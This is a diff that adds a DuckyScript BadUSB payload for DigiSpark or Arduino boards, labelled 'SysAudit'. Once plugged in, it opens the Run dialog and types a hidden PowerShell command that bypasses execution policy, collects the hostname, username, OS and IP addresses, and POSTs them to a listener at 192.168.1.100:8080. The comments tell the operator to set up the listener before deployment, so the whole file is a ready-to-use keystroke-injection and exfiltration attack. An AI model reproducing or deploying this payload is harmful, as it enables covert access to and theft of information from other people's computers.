@@ -1,0 +1,15 @@
+REM BadUSB SysAudit Windows — DuckyScript-compatible HID injection payload
+REM Compatible with: DigiSpark, Arduino Micro, SparkFun Pro Micro (ATmega32U4)
+REM For DigiSpark: compile with Arduino IDE + DigiKeyboard library
+REM For Arduino Micro/Pro Micro: use standard USB HID Keyboard library
+REM
+REM CONFIGURE THESE BEFORE DEPLOYMENT:
+REM   $SERVER = your listener IP
+REM   $PORT   = your listener port (run: python3 -m http.server 8080)
+
+DELAY 2000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$s='http://192.168.1.100:8080';$o=@{H=hostname;U=$env:USERNAME;OS=(gwmi Win32_OperatingSystem).Caption;IP=(ipconfig | Select-String 'IPv4').Line};Invoke-RestMethod -Uri '$s/upload' -Method POST -Body ($o|ConvertTo-Json)"
+ENTER
+DELAY 5000
